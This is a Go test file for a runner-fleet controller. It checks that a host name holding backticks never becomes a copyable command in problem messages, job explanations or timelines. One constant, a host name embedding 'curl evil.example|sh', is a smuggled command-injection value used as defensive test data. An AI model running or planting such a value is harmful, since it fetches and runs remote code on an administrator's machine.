package controller

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/backend"
	"github.com/eyupio/zoomies/internal/hosttune"
	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// hostileHostName is the name the review agent joined with. It is in the
// database of any fleet that enrolled such a host before the join refused it,
// which is why a problem has to be safe for a name it would no longer accept.
const hostileHostName = "a`curl evil.example|sh`b"

// codeSpans is what the UI makes of a sentence: the text between each pair of
// backticks on one line, which RemedyText.svelte draws as a command with a copy
// button. The pattern is the component's own, so this fails where the UI would.
var codeSpans = regexp.MustCompile("`([^`\n]+)`")

// onFresh gives a row a harness of its own, for the rows that need nothing but
// an empty fleet and a host called what the test says.
func onFresh(setup func(t *testing.T, h *harness, name string)) func(t *testing.T, name string) *harness {
	return func(t *testing.T, name string) *harness {
		h := newHarness(t)
		setup(t, h, name)
		return h
	}
}

// rename gives a host the name a test wants, the way a fleet that enrolled such
// a host before the join refused it would hold it, and returns the row as stored.
func (h *harness) rename(t *testing.T, host *store.Host, name string) *store.Host {
	t.Helper()
	if err := h.st.PatchHost(h.ctx, host.ID, store.HostChanges{Name: &name}); err != nil {
		t.Fatalf("PatchHost: %v", err)
	}
	return h.reread(t, host.ID)
}

// hostNameRows are the problems that put a host's name in a sentence, each with
// the smallest fleet that raises it. A problem that names its host and is not
// here is a problem nobody has checked.
var hostNameRows = []struct {
	name  string
	codes []string
	setup func(t *testing.T, name string) *harness
}{
	{"a silent host", []string{"host.unhealthy"}, onFresh(func(t *testing.T, h *harness, name string) {
		h.silence(t, h.host(name))
	})},
	{"two agents on one host", []string{"host.duplicate_agent"}, onFresh(func(t *testing.T, h *harness, name string) {
		host := h.host(name)
		for _, session := range []string{"ses_one", "ses_two", "ses_one"} {
			if _, err := h.st.RecordAgentSession(h.ctx, host.ID, session); err != nil {
				t.Fatalf("RecordAgentSession: %v", err)
			}
		}
	})},
	{"a cordoned host with work waiting", []string{"host.cordoned_with_work"}, onFresh(func(t *testing.T, h *harness, name string) {
		inst := h.installation()
		h.pool(inst, "demo")
		host := h.host(name)
		if err := h.st.SetHostCordoned(h.ctx, host.ID, true); err != nil {
			t.Fatalf("SetHostCordoned: %v", err)
		}
		h.deliverJob(jobEvent{Action: "queued", JobID: 2, Labels: []string{"self-hosted", "linux", "x64", "demo"}})
	})},
	{"an OS report that is stale, flags a check and wants a reboot", osHealthCodes, onFresh(func(t *testing.T, h *harness, name string) {
		host := h.host(name)
		r := report(h.c.Now().Add(-time.Hour),
			check("inotify.watches", hosttune.Safe, hosttune.Warn, false),
			check(hosttune.KernelPending, hosttune.Safe, hosttune.Warn, false))
		r.RebootPending = true
		h.reports(t, host, r)
	})},
	{"a host running another version", []string{"host.version_behind"}, onFresh(func(t *testing.T, h *harness, name string) {
		asRelease(t, "v1.2.0")
		host := h.host(name)
		host.Version = "v0.0.1"
		if err := h.st.UpdateHost(h.ctx, host); err != nil {
			t.Fatal(err)
		}
	})},
	{"a host that has measured nothing", []string{"host.resources_unknown"}, onFresh(func(t *testing.T, h *harness, name string) {
		host := h.host(name)
		host.CPUs, host.MemoryMB, host.DiskTotalMB, host.DiskFreeMB = 0, 0, 0, 0
		if err := h.st.UpdateHost(h.ctx, host); err != nil {
			t.Fatal(err)
		}
	})},
	{"a daemon whose limits are unverified", []string{"host.limits_unverified"}, onFresh(func(t *testing.T, h *harness, name string) {
		h.measuredHost(name, 8, 16384, 4, store.LimitSupport{})
	})},
	{"a daemon that cannot apply a limit", []string{"host.limits_unenforceable"}, onFresh(func(t *testing.T, h *harness, name string) {
		h.measuredHost(name, 8, 16384, 4, store.LimitSupport{Known: true, CPU: false, Memory: true, Pids: true})
	})},
	{"a shared folder that is not mounted", []string{"host.shared_folder_unmounted"}, onFresh(func(t *testing.T, h *harness, name string) {
		p := h.pool(h.installation(), "linux")
		p.Cache = store.CacheConfig{Enabled: true, Tools: true, Scope: store.CacheScopePool}
		if err := h.st.UpdatePool(h.ctx, p); err != nil {
			t.Fatalf("UpdatePool: %v", err)
		}
		host := h.host(name)
		host.BackendInfo = store.HostBackends{{
			Kind: store.BackendDocker, Available: true,
			SharedFolder: "the shared folder /var/lib/zoomies/shared is not mounted into this container from the host",
		}}
		if err := h.st.UpdateHost(h.ctx, host); err != nil {
			t.Fatalf("UpdateHost: %v", err)
		}
	})},
	{"a throttled host", []string{"host.throttled"}, onFresh(func(t *testing.T, h *harness, name string) {
		host := h.measuredHost(name, 8, 16384, 4, enforcesEverything)
		now := h.c.Now()
		if err := h.st.SetHostThrottle(h.ctx, host.ID, store.HostThrottle{
			Level: 1, Since: &now, ChangedAt: &now, Reason: "its load average is 20.0",
		}, 0); err != nil {
			t.Fatalf("SetHostThrottle: %v", err)
		}
	})},
	{"a host too small for its capacity", []string{"host.overprovisioned"}, onFresh(func(t *testing.T, h *harness, name string) {
		h.measuredHost(name, 2, 4096, 3, enforcesEverything)
	})},
	{"a runtime that keeps failing", []string{"host.runtime_recovering"}, onFresh(func(t *testing.T, h *harness, name string) {
		host := h.host(name)
		h.beat(t, host.ID, &agent.RuntimeReport{Failures: 3, Kind: agent.RuntimeUnavailable,
			Error: "backend: not available on this host", RetryIn: 40 * time.Second})
	})},
	{"a host holding fewer slots than its capacity", []string{"host.slots_below_capacity"}, func(t *testing.T, name string) *harness {
		h, host, pool := capacityFleet(t, nil)
		waiting(h, pool)
		h.rename(t, host, name)
		return h
	}},
	{"a throttled host with idle ones beside it", []string{"host.work_concentrated"}, func(t *testing.T, name string) *harness {
		h, big := concentratedFleet(t, true)
		h.rename(t, big, name)
		small, err := h.st.GetHostByName(h.ctx, "small")
		if err != nil {
			t.Fatalf("GetHostByName: %v", err)
		}
		h.rename(t, small, name+"-idle")
		return h
	}},
	{"a host out of memory to lend", []string{"host.memory_pool_exhausted"}, func(t *testing.T, name string) *harness {
		return memoryRefusal(t, name, backend.MemoryValveSample{Mode: "automatic", Code: "pool_empty", Reason: "the host has no spare memory left to lend"})
	}},
	{"a pool at its memory ceiling on that host", []string{"pool.memory_ceiling_reached"}, func(t *testing.T, name string) *harness {
		return memoryRefusal(t, name, backend.MemoryValveSample{Mode: "automatic", Code: "at_ceiling", LentBytes: 2048 * mb})
	}},
	{"a disk-bound host with memory to spare", []string{"pool.tmpfs_suggested"}, func(t *testing.T, name string) *harness {
		h := newHarness(t)
		_, pool, host := h.fleet()
		host = h.rename(t, host, name)
		h.diskBoundHost(host, 25*time.Minute, 20_000)
		h.ranJobs(pool, host, 4)
		return h
	}},
}

// memoryRefusal is a host whose elastic-memory valve has said what the sample
// says, which is what raises the two memory problems.
func memoryRefusal(t *testing.T, name string, sample backend.MemoryValveSample) *harness {
	t.Helper()
	h := newHarness(t)
	_, pool, host := h.fleet()
	host = h.rename(t, host, name)
	h.valvePool(pool, store.MemoryBurstAutomatic, 0)
	r := h.valveRunner(pool, host, store.RunnerBusy)
	memoryBeat(h, host, valveReport(r, h.c.Now(), sample))
	return h
}

// A host's name is chosen by its agent, and a problem reaches every signed-in
// viewer and the MCP tools. The UI draws a backtick pair in a problem as a
// command with a copy button, so a name carrying one would hand an enrolled
// agent a way to put a command in front of an administrator. Joining refuses
// such a name now; this is the half for the ones already stored.
func TestAProblemNeverLetsAHostNameOpenACodeSpan(t *testing.T) {
	for _, row := range hostNameRows {
		t.Run(row.name, func(t *testing.T) {
			h := row.setup(t, hostileHostName)

			ps, err := h.c.Problems(h.ctx)
			if err != nil {
				t.Fatalf("Problems: %v", err)
			}
			for _, code := range row.codes {
				var found []Problem
				for _, p := range ps {
					if p.Code == code {
						found = append(found, p)
					}
				}
				if len(found) == 0 {
					t.Fatalf("no %s problem in %v; the scenario no longer raises what it claims to", code, h.problemCodes())
				}
				for _, p := range found {
					assertHostNameIsProse(t, p)
				}
			}
		})
	}
}

// assertHostNameIsProse fails when any sentence of the problem lets the hostile
// name open a code span, or lets the name through whole, and when the name has
// gone altogether -- a problem that no longer says which host it is about is
// safe and useless.
func assertHostNameIsProse(t *testing.T, p Problem) {
	t.Helper()
	named := false
	for field, text := range map[string]string{"title": p.Title, "detail": p.Detail, "fix": p.Fix} {
		if !hostNameIsProse(t, p.Code+" "+field, text) {
			continue
		}
		if strings.Contains(text, naming.ForSentence(hostileHostName)) {
			named = true
		}
	}
	if !named {
		t.Errorf("%s no longer names the host: %+v", p.Code, p)
	}
}

// hostNameIsProse reports whether one sentence keeps the hostile name out of
// every code span, and says so on the test when it does not.
func hostNameIsProse(t *testing.T, where, text string) bool {
	t.Helper()
	ok := true
	for _, m := range codeSpans.FindAllStringSubmatch(text, -1) {
		if strings.Contains(m[1], "evil.example") {
			t.Errorf("%s: the host's name opens a code span (%q): %s", where, m[1], text)
			ok = false
		}
	}
	if strings.Contains(text, hostileHostName) {
		t.Errorf("%s: carries the host's name as stored: %s", where, text)
		ok = false
	}
	return ok
}

// The rule that keeps a name out of a code span must not touch the commands a
// problem offers on purpose. The OS health fix quotes `zoomies doctor` and the
// reboot fix `zoomies hosts cordon <id>`; an operator copies those, and a fix
// that lost its commands because the host's name was odd would be no fix.
func TestAHostNameThatIsNeutralisedLeavesTheProblemsOwnCommandsAlone(t *testing.T) {
	h := newHarness(t)
	host := h.host(hostileHostName)
	r := report(h.c.Now(), check(hosttune.KernelPending, hosttune.Safe, hosttune.Warn, false))
	r.RebootPending = true
	h.reports(t, host, r)

	p := h.problem(t, "host.reboot_pending")
	var spans []string
	for _, m := range codeSpans.FindAllStringSubmatch(p.Fix, -1) {
		spans = append(spans, m[1])
	}
	want := []string{"zoomies hosts cordon " + host.ID, "zoomies hosts uncordon " + host.ID}
	if strings.Join(spans, "|") != strings.Join(want, "|") {
		t.Errorf("code spans in the fix = %q, want exactly %q", spans, want)
	}
}

// A name the join accepts must read the same in a problem as it does on the
// host's page, or an operator searching the list for the name on the card would
// not find it.
func TestAHostNameThatIsFineReadsUnchangedInAProblem(t *testing.T) {
	h := newHarness(t)
	h.silence(t, h.host("zoomies-16vcpu-32gb-ubuntu-2404-build01"))

	p := h.problem(t, "host.unhealthy")
	if !strings.Contains(p.Title, "zoomies-16vcpu-32gb-ubuntu-2404-build01") || !strings.Contains(p.Fix, "zoomies-16vcpu-32gb-ubuntu-2404-build01") {
		t.Errorf("the name was altered on its way into the problem: %+v", p)
	}
}

// The problems list is not the only place a sentence about a host reaches a
// RemedyText: a job's explanation, a pool's host fit, a refused edit and a
// job's timeline name hosts too, and each takes the same care.
func TestOtherSentencesThatNameAHostNeverLetItOpenACodeSpan(t *testing.T) {
	t.Run("a job on a host that has gone quiet", func(t *testing.T) {
		h := newHarness(t)
		_, pool, host := h.fleet()
		host = h.rename(t, host, hostileHostName)
		runner := h.seedRunner(t, pool, host, store.RunnerBusy)
		job := h.queuedJob(t, pool, []string{"self-hosted", "linux"})
		started := h.c.Now().Add(-time.Minute)
		if _, err := h.st.UpsertJob(h.ctx, &store.Job{
			GitHubJobID: job.GitHubJobID, State: store.JobInProgress, Repo: job.Repo,
			RunnerID: runner.ID, RunnerName: runner.Name, StartedAt: &started,
		}); err != nil {
			t.Fatalf("UpsertJob: %v", err)
		}
		h.advance(store.HeartbeatTimeout + time.Minute)

		got, err := h.c.ExplainJob(h.ctx, job.ID, 0)
		if err != nil {
			t.Fatalf("ExplainJob: %v", err)
		}
		if !strings.Contains(got.Detail, naming.ForSentence(hostileHostName)) {
			t.Fatalf("the explanation no longer names the host: %q", got.Detail)
		}
		hostNameIsProse(t, "the job explanation", got.Detail)
		hostNameIsProse(t, "the job explanation's fix", got.Fix)
	})

	t.Run("the host a pool cannot run on", func(t *testing.T) {
		h := newHarness(t)
		pool := h.pool(h.installation(), "small")
		pool.Resources = store.Resources{CPUs: 2, MemoryMB: 2048}
		if err := h.st.UpdatePool(h.ctx, pool); err != nil {
			t.Fatal(err)
		}
		host := h.rename(t, h.measuredHost("big", 12, 32768, 8, enforcesEverything), hostileHostName)
		h.profile(host, store.RunnerProfile{Minimum: store.RunnerSize{CPUs: 3}})

		fit, err := h.c.HostFit(h.ctx, pool)
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(fit.Detail, naming.ForSentence(hostileHostName)+" cannot run it") {
			t.Fatalf("the explanation does not name the host: %q", fit.Detail)
		}
		hostNameIsProse(t, "the host fit", fit.Detail)
	})

	t.Run("the host an edit would leave a pool without", func(t *testing.T) {
		h := newHarness(t)
		_, p, host := h.fleet()
		p.Resources = store.Resources{CPUs: 4, MemoryMB: 16 * 1024}
		if err := h.st.UpdatePool(h.ctx, p); err != nil {
			t.Fatalf("UpdatePool: %v", err)
		}
		proposed := *h.rename(t, host, hostileHostName)
		proposed.ReserveMemoryMB = 56 * 1024

		stranded, err := h.c.HostStrandings(h.ctx, &proposed)
		if err != nil || len(stranded) != 1 {
			t.Fatalf("strandings = %#v, %v; want the pool stranded", stranded, err)
		}
		if got := stranded[0].Host; got != naming.ForSentence(hostileHostName) {
			t.Errorf("stranded host = %q, want the name as prose %q", got, naming.ForSentence(hostileHostName))
		}
	})

	t.Run("the line a job's timeline carries when it starts", func(t *testing.T) {
		h := newHarness(t)
		_, pool, host := h.fleet()
		host = h.rename(t, host, hostileHostName)
		runner := h.seedRunner(t, pool, host, store.RunnerBusy)
		job := h.queuedJob(t, pool, []string{"self-hosted", "linux"})

		msg := h.c.startMessage(h.ctx, job, runner)
		if !strings.Contains(msg, naming.ForSentence(hostileHostName)) {
			t.Fatalf("the timeline no longer names the host: %q", msg)
		}
		hostNameIsProse(t, "the start message", msg)
	})
}
